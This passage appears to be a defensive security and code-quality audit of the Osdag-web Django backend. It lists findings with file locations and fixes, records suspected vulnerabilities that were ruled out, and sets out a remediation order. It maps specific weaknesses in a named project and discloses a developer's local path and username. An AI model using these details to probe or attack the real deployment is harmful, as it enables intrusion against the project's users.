| `apps/core/tests/test_my_data.py` | 4 |
| `apps/core/tests/test_email_verification.py` | 3 |
| `apps/core/api/design/tests/test_design_report_with_images.py` | 2 |
| `apps/core/tests/test_gdpr_compliance.py` | 2 |

**Zero tests** for: `apps/modules/` (all 7 parents, 27 adapters, 27 services, all registries), the
WebSocket consumers, the Celery tasks, the PSO optimization, `apps/sections/`, and `config/`. That is
precisely why #3, #4, #13, #14, #34, #35, #36 and #37 survived.

**Fix**
1. Make the skip explicit and opt-in: `if os.environ.get('SKIP_BACKEND_TESTS') == 'true'`, and remove
   `CI` from the trigger. Run the tests in CI.
2. Add the highest-value tests first — they are cheap and each maps to a finding above:
   - **frontend↔backend key contract** (catches #3, #39): assert `set(adapter.get_required_keys()) <= set(frontend.buildSubmissionParams())` per submodule.
   - **slug uniqueness across parents** (catches #35).
   - **`SECTION_MAPPINGS ⊆ adapter_allowlist`** (catches #36, #37).
   - **`success` derived from output, never hardcoded** (catches #4).
   - **path-containment tests** for the report `images` key, `report_id`, and CAD download (catches #5, #9, #10).
   - **one `report_generate_initial` per parent** via DRF router introspection (catches #14).
3. Set up `pytest-django` config in `pyproject.toml` so `--ds=config.settings` is not required by hand.

## 47. 814 `print()` calls in production module code

**Location:** `backend/apps/modules/` — 814 across 44 files (plus 153 in `apps/core/`, 1 in `sections/`).

Top offenders:

| Count | File |
|---|---|
| 125 | `shear_connection/submodules/fin_plate/adapter.py` |
| 74 | `shear_connection/submodules/cleat_angle/adapter.py` |
| 56 | `simple_connection/submodules/lap_joint_bolted/adapter.py` |
| 40 | `simple_connection/submodules/butt_joint_bolted/adapter.py` |
| 35 | `shear_connection/submodules/header_plate/adapter.py` |
| 24 | `moment_connection/submodules/beam_beam_end_plate/adapter.py` |
| 22 | `moment_connection/submodules/column_column_end_plate/adapter.py` |
| 20 | 8 files (all `tension_member`/`compression_member` services, `shear/fin_plate/service.py`, …) |
| 18 | `moment_connection/shared.py` |
| 16 | `tension_member/shared.py`, `seated_angle/adapter.py`, 2 cover-plate-welded adapters |

These run inside Celery workers. `print` is unsynchronized and interleaves with the WebSocket log
stream, corrupting both. The project already has the right channel —
`osdag_core.custom_logger.CustomLogger`, which `generate_output` reads via `module.logger.get_logs()`.
The `print`s duplicate that stream and bypass it.

Several are also **inside `except` blocks** (see `seated_angle/adapter.py:213-216`), which is how the
failures in #4 stay invisible.

**Fix:** `logger = logging.getLogger(__name__)` per module; route diagnostics through `CustomLogger`
or `logger.debug`, gated on `DEBUG`. With ruff installed, `T201` finds these automatically.

## 48. No `Project` serializer; all project views are hand-built

**Location:** `backend/apps/core/serializers.py` defines `UserAccount_Serializer` (`:14`),
`OsiFileSerializer` (`:30`) and 15 catalog serializers — **nothing for `Project`**. All project views
are plain `APIView` with hand-built responses (`project_api.py:14,120,254`; `osi_api.py:19,50,81,105,122`);
only `osi_api.py:13` imports a serializer at all.

**Impact:** project CRUD bypasses DRF serialization entirely — no field validation, no type coercion,
no `unique_together` enforcement, no length limits. `name` is `CharField(max_length=200)` and
`inputs_json` is an unbounded `JSONField`, so over-long or wrong-typed values surface as DB errors
returned with `str(e)` (#29). `ProjectByNameAPI.get` also raises `MultipleObjectsReturned` on
duplicate names → 400. `DEFAULT_PARSER_CLASSES` being JSON-only compounds this.

*Positive finding, so it is not re-reported:* project **ownership scoping is correct** — every view
filters `user_email=user_email` / `get(id=..., user_email=...)`, `POST` sets `user_email` server-side
and rejects an empty email, and guests get 403. `ProjectOsiDownload` is likewise correctly scoped.

**Fix:** add a `ProjectSerializer` with `validate_name` (length, uniqueness) and an
`inputs_json`/`outputs_json` size guard; switch the views to it.

---

# Low / Info

## 49. Type-confusion 500s in report generation
**Location:** `design_report_pdf_view.py:124-129`
```python
            metadata_final = metadata            # aliased, no isinstance check
...
            metadata_final['filename'] = file_path
            logger_string = '\n'.join([f"...{log.get(...)}" for log in logs])
```
A truthy non-dict `metadata` (e.g. `"x"` or `[]`) raises `TypeError` outside any handler → 500. Likewise
`logs: [1,2]` breaks `log.get(...)`. Both are unauthenticated and repeatable. **Fix:** validate
`isinstance(metadata, dict)` and each log entry; also stop aliasing the caller's dict (mutating the
request object in place is a side effect).

## 50. Hardcoded `time.sleep(3)` in the request path
**Location:** `design_report_pdf_view.py:242` — pure latency on every report request, reached on the
guest-accessible synchronous compression-member path (#14). **Fix:** remove it; if a settle delay is
genuinely needed for a filesystem, poll with a bounded condition instead.

## 51. `parse_osi` version check defeated by the YAML fallback
**Location:** `backend/apps/core/utils/osi_files.py::parse_osi` — the whole JSON branch is wrapped in
`try: ... except Exception:`, falling back to `_parse_flat_yaml`. So `"version": "9.9"` is re-parsed as
flat YAML instead of being rejected, making the `SUPPORTED_VERSIONS` gate ineffective.
**Fix:** parse JSON, then validate the version **outside** the fallback.

## 52. `import tkinter` in a headless-container code path
**Location:** `backend/apps/core/utils/osi_files.py:5` imports `tkinter` (for `messagebox`) though it
is never used. `tkinter` requires `python3-tk`, which is **not** in the `Dockerfile`. If absent, the
import fails and **every** OSI endpoint breaks at import time. **Fix:** delete the unused import.

## 53. `config/mailing.py` prints the SMTP password
**Location:** `backend/config/mailing.py:17-20`
```python
PASSWORD = utils.PASSWORD
print('password : ' , PASSWORD)      # SMTP credential to stdout
```
Latent: `send_mail` is dead code and never imported, and email verification is Firebase-hosted. The
moment anyone wires it up, the credential goes to `docker logs` and any log aggregator. The module also
uses `print` instead of `logging` and hardcodes `OTP=123` as a default (`:7`).
**Fix:** delete the module, or at minimum replace `print` with `logger.debug` and never log `PASSWORD`.

## 54. Absolute developer path committed in a migration
**Location:** `backend/apps/core/migrations/0013_alter_angles_lumax_alter_angles_lvmin_and_more.py:25`
```python
                location=pathlib.PurePosixPath('/Users/varnikumarpatel/Study/Osdag-web/osifiles')
```
`0015_...py:22` bakes a second, different path (`/app/osifiles`). `models.py:12-15` builds the storage
from a *variable*, and Django's autodetector deconstructs storage **by value**, so the detected
location depends on the local machine. This is an information disclosure (a colleague's home directory,
OS, and username, permanently in git) and makes `makemigrations --check` report spurious drift.
**Fix:** a `deconstructible` custom storage whose `deconstruct()` returns a stable symbolic path, then
squash `0001`–`0016`.

---

# Additional findings worth noting

| Area | Finding | Location |
|---|---|---|
| `config/celery.py:23-25` | `debug_task` ships in the production image; prints `self.request!r`. Guard with `if settings.DEBUG` or delete. | |
| `config/settings.py:286` | `SECRET_ROOT` points at `secret/`, which does not exist and is never created. Its only consumer (`user_view.py:31`) never uses it. Dead config implying a secrets mechanism that doesn't exist. | |
| `config/settings.py:22-30,32-35,301-302` | Import-time side effects: settings auto-load the repo-root `.env` into `os.environ`, insert the repo root at `sys.path[0]` (so any repo-root module can shadow a stdlib/third-party name), and `mkdir` a logs dir. Settings should be inert. | |
| `apps/core/views.py:33-34` | Public dev stubs `/jwt/home` and `/googlesso/` are still routed in the production URLconf. Remove both. | |
| `apps/core/views.py:36-39` | A missing Firebase service account degrades to a `print` and the process starts anyway, so every later `verify_id_token` fails with an opaque 400. Raise `ImproperlyConfigured` in `apps/core/apps.py::ready()` (the pattern `config/secret_key.py:6-13` already uses). | |
| `apps/core/api/design/sync_merge.py` | A third, parallel cantilever-beam implementation living outside the module layer, and a third `Flexure_Cantilever` instantiation on every request (`on_cantilever/adapter.py` + `service.py:15-20` + `sync_merge.py`) — double compute cost. Retire or clearly mark it. | |
| `plate_girder/adapter.py:38-40` | Dead code that opens a handle to `os.devnull` and discards it — leaking the handle. `get_optimization_required_keys()` (`:72-105`) is never called. | |
| `header_plate/service.py:10-18` | The class is named `EndPlateService` while `__init__.py:5` declares `MODULE_ID = 'HeaderPlateConnection'`. Misleading in tracebacks. | |
| `seated_angle/adapter.py:211` | `# validate_input(input_values)` is commented out — dead validation. | |
| `apps/core/tasks.py:11-15` | `flexure_member/views.py:173` uses `get_service_by_slug` **without** the allowlist, unlike the other five parents. Not exploitable (only reached under `if slug == 'plate-girder'`) but breaks the pattern. | |
| `requirements.txt` | `certifi==2020.4.5.1` and `PyYAML==5.3.1` are ~5 years stale — the CA bundle predates most current roots; PyYAML 5.x is the pre-6.0 unsafe-loader era. `Django~=4.2.0` floats across all 4.2.x, so builds are **not reproducible**, and 10 packages (including `PySide6>=6.0.0`) are completely unpinned. `django-allauth`, `dj-rest-auth`, and `djangorestframework-simplejwt` are installed but not in `INSTALLED_APPS` and not routed — needless CVE surface. **Note:** there is no `backend/requirements.txt`; the root one is the only file (CONTEXT.md is inaccurate on this). | |
| `.github/workflows/` | **GHCR namespace mismatch:** `cd.yml` pushes to `ghcr.io/captain-07/osdag-web/*` (derived from the repo) but `docker-compose.prod.yml` pulls `ghcr.io/sogalabhi/osdag-web/*`. The prod deploy pulls stale or foreign images. Also: `backend-qa` uses Python 3.11 while the Docker image uses 3.12; no backend lint step (see #45). | |
| `monitoring/` | `metrics_collector.py` is a complete 432-line sidecar whose compose service is **fully commented out** in dev and **absent** in prod. `monitoring/Dockerfile` has no `CMD`; `influxdb-init.sh` is unreferenced. Observability is defined but not deployed. | |
| `load_tests/` | `run_automated_tests.py` hardcodes `DEFAULT_HOST=http://10.104.135.9:8000` — a private LAN address as the default target. | |
| `README.md` | Broken doc links: `documentation/installation.md` and `documentation/chapter_12_load_testing_observability.md` do not exist (real paths are `documentation/general/installation_docs_*.md` and `documentation/chapter_12_load_testing.md`). | |
| `settings.py:148-155, 206-216` | When `USE_REDIS_CACHE=false` (the dev default) no `CACHES` is defined, so each of the 8 gunicorn workers keeps an independent `LocMemCache`. Token verification is cached 8× independently and revocation latency becomes per-worker and non-deterministic. Always define `CACHES`. | |
| `settings.py:178` | `CELERY_TASK_ALWAYS_EAGER = 'test' in sys.argv or any('pytest' in arg for arg in sys.argv)` — a fragile token match that could flip a production-like invocation into inline eager mode. Use a dedicated `TESTING` flag from a test settings module. | |
| `api/design/material_api.py:42-43` | Redundant manual `is_authenticated` check inside a view with no `permission_classes`; the DRF default already rejects unverified users. Dead code, not a bypass. | |
| `middleware/metrics_middleware.py:140-141` | `X-User-Email` is trusted as an InfluxDB tag with no format validation — unbounded tag cardinality and dashboard poisoning. Verified **not** used for authorization. Hash or drop the tag for unauthenticated requests. | |

---

# Ruled out — verified NOT vulnerabilities

Recorded so these are not re-reported. Each was specifically checked.

| Claim | Why it is not a finding |
|---|---|
| Celery `task_postrun` / `task_failure` / `task_retry` handler signatures | **Verified correct.** Celery sends these signals with keyword arguments, and the handlers match exactly: `on_task_postrun(task_id, task, retval, state, **kwargs)`, `on_task_failure(task_id, exception, task, **kwargs)`, `on_task_retry(request, reason, **kwargs)`. No `AttributeError`, no dropped results. |
| Design errors are never broadcast to the WebSocket | **False.** `signals.py:147-148` sets `error_val = str(retval)` on any non-`SUCCESS` state and the broadcast at `:150` is outside the serialization `try`. Errors *are* delivered. (The 500 KB truncation path at `:135-144` **is** a real bug — see #15.) |
| `WebMainRegistry` thread-local list is never cleared (memory leak) | **False.** `stop_recording` clears `recorded` (`main_registry.py:12-16`) and `tasks.py:111-112` calls it in a `finally`. |
| `/admin/` is unprotected | **False.** Mounted at `config/urls.py:9` with Django's standard staff/superuser checks, and `CsrfViewMiddleware` is enabled (`settings.py:118`). |
| `IsEmailVerified` can be bypassed by omitting the auth header | **False.** `firebase_auth.py:37-38` returns `None` for a missing header, leaving the request anonymous, and `permissions.py:9-10` returns `False` for `IsEmailVerified`. |
| `request.email_verified` is set on a DRF `Request` that has no `__setattr__` | **False.** DRF 3.16's `Request` has no `__setattr__`, so the attribute lands in the instance `__dict__` — and the *same* instance is passed to permission classes by `APIView.initial`, so it reads correctly. |
| Firebase verification trusts unverified claims | **False.** `verify_id_token` validates signature, audience, issuer, and expiry; `email_verified` is read from the verified token, never the request body. |
| SQL injection via f-string table names in `options_merge.py` | **False.** The interpolated `table` comes from a hardcoded dict gated by `if table in (...)`; all 22 values are bound parameters. Same for `purlin/adapter.py:100`. No `.raw()` or `.extra()` exists anywhere in the repo. |
| Pickle deserialization of Celery messages (Redis write → RCE) | **False, and important to preserve.** `CELERY_ACCEPT_CONTENT = ['json']` (`settings.py:174`). A poisoned message is rejected with `ContentDisallowed`. |
| `yaml.load()` / `pickle` / `eval` / `exec` RCE | **False.** Repo-wide grep found only `yaml.safe_load` (`osdag_core/cli.py:87`). `osi_files.py` uses a hand-rolled flat-YAML reader, not a YAML library. |
| OS command injection in the `pdflatex` call | **False.** `subprocess.run` uses an argument **list** with no `shell=True`, and no client data reaches `argv`. (LaTeX *content* injection is real — see #25 — but that is a different class of bug.) |
| XXE via uploaded xlsx | **False.** `defusedxml==0.6.0` is pinned (`requirements.txt:96`) and openpyxl uses it. |
| Arbitrary module import via `module_id` | **False.** Every module/slug resolution is a dict lookup (`registry.py:40-98`, `module_finder.py:196-222`, `constants.py:45-46`), and the per-parent allowlists in `get_service_by_slug_or_404` block orphaned submodules. |
| `Content-Disposition` CRLF header injection | **False.** Django raises `BadHeaderError` on all four sites; it degrades to an error response, not a header split. |
| Zip/archive extraction traversal | **False.** Zero `ZipFile`/`extractall`/`tarfile` hits in the repo. |
| CSRF on the `csrf_exempt` APIViews | **Not a finding.** The only auth backend is `FirebaseAuthentication` (Bearer tokens), which is not cookie-based, so ambient-cookie CSRF does not apply. Worth removing for defence in depth, but not exploitable. `/admin/` retains full CSRF protection. |
| Project CRUD IDOR | **False.** Every project view filters by `user_email`; `POST` sets `user_email` server-side and rejects an empty email; guests get 403. `ProjectOsiDownload` is correctly scoped. |
| `CustomMaterials` ownership | **False.** All verbs scope to `user=request.user`, with a proper composite unique constraint (`models.py:370-375`) and `on_delete=CASCADE`. |
| Sections app authorization | **False.** `validation.py:19,119-130` allowlist table names; `options_merge.py:77,144,160` filter by `user=user, is_active=True`; all four section views use `IsAuthenticated`. No IDOR. |
| `IsEmailVerifiedIfAuthenticated` allows anonymous | **By design**, not a bug. It returns `True` for anonymous users and blocks authenticated-unverified. Guest mode is an explicit product feature — the fix is throttling (#16), not removal. |
| Docker Compose container misconfiguration | **False.** Prod publishes only `80:80`; `db`, `redis`, and InfluxDB have no `ports:` mapping; `DATABASE_PASSWORD` and `SECRET_KEY` use fail-closed `:?` syntax. (`INFLUXDB_TOKEN` is required in dev but *not* referenced in prod — see #21 for the Redis analogue.) |

---

# `UNVERIFIED` — needs a runtime check

Do **not** rate these higher without confirmation.

1. **LaTeX → OS command execution** (#25). No `--shell-escape` in code and TeX Live defaults to
   `-no-shell-escape`, so this is very likely confined to TeX-level injection. Confirm the deployed
   `texmf.cnf` / `TEXMFVAR` inside the backend image.
2. **PyLaTeX escaping semantics** (#25). The package is not installed locally, so whether
   `reportGenerator_latex.py:181` (`uiObj[i]`) and `:526` (`logger_msgs`) are auto-escaped is
   unconfirmed. The *application* performs no escaping either way.
3. **Purlin metre→mm conversion** (#39). Static reading strongly indicates a 1000× error, but no design
   was executed. Verify before fixing — a downstream conversion may exist.
4. **Whether the committed `.env` values are still live** (#1). Cannot be determined from the repo.
   They are non-empty and were used by the dev configuration, so treat them as compromised.
5. **Postgres/SQLite catalog drift** (#19). `validation.py:207` blocks creating a `UserCustom*` whose
   designation already exists, but it checks the **Postgres** catalog while the write targets
   **SQLite**. Any drift would allow clobbering a global section definition. Not confirmed at runtime.
6. **`django-silk` runtime behaviour** (#2). The package is not installed locally, so finding #2 rests
   on the documented defaults (`SILKY_AUTHENTICATION = False`, `SILKY_AUTHORISATION = False`) plus the
   confirmed absence of any override and of a `DEBUG` gate. The prod `ALLOWED_HOSTS` default raises the
   bar to a `Host`-header match but is **not** an authorization control.

---

# Suggested fix order

**Stage 1 — rotate and stop the bleeding (day 1)**
1. Rotate `SECRET_KEY`, `DATABASE_PASSWORD`, `INFLUXDB_TOKEN`; `git rm --cached .env`; purge history (#1).
2. Gate `/silk/` behind `DEBUG` (#2).
3. Restrict the report `images` key to the allowlist with a path-containment check (#5).
4. Add `AllowedHostsOriginValidator` and authenticate both WebSocket consumers (#6).

**Stage 2 — close the unauthorized-data paths (week 1)**
5. Ownership checks on `TaskStatusAPIView` (#7), `OpenOsiById` (#8), CAD download (#10); stop echoing
   `str(exception)` (#29).
6. Validate `report_id` with a regex + containment (#9).
7. Remove `os.chdir` and anchor all paths to `settings.FILE_STORAGE_ROOT` (#11, and unblocks #10).
8. Add rate limiting (#16); convert the two plain `View` CAD endpoints to `APIView` (#17); remove the
   nginx `/osifiles/` alias and use `X-Accel-Redirect` (#18).

**Stage 3 — fix the engineering-correctness defects (week 1–2)**
These are the ones that matter most for a structural design tool: a wrong answer is worse than an error.
9. Purlin key contract (#3) **and** the shared-contract test that prevents its recurrence (#46).
10. Derive `success` from the output; make `seated_angle.create_from_input` fail loudly (#4).
11. Purlin unit conversion — after confirming at runtime (#39).
12. `Area/100` heuristic removal (#40).
13. `get_service_class` parent-first resolution + slug-uniqueness test (#35).

**Stage 4 — process and observability (week 2–3)**
14. Add `ruff` + `pre-commit`, wire into CI (#45); remove the `CI` skip and get the tests running (#46).
15. Add the five high-value contract tests from #46.
16. Convert the 814 `print()`s to `logger` (#47); add a `ProjectSerializer` (#48).
17. Celery reliability settings, PSO queue routing, `celery.py` exception handling (#31, #32, #33).
18. `CONN_MAX_AGE=60`; define `CACHES` unconditionally; `populate_database.py` fail-closed (#34, #30).
19. Fix the GHCR namespace mismatch; reconcile the three worker-topology answers (dev = 1 worker/4
    queues, prod = 3 isolated workers, README = `--concurrency=4`).

**Stage 5 — structural (month 2)**
20. Stop mutating the shared SQLite catalog; pass custom sections per-request (#19).
21. Model changes: `Project.user` FK + indexes, `OsiFile.owner_email NOT NULL` (#41, #43) with a
    squashed migration set that removes the destructive `RunPython` and the leaked path (#44, #54).
22. Dependency refresh: `certifi`, `PyYAML`→6.x, pin `Django==4.2.x` exactly, drop the three unused
    auth packages.
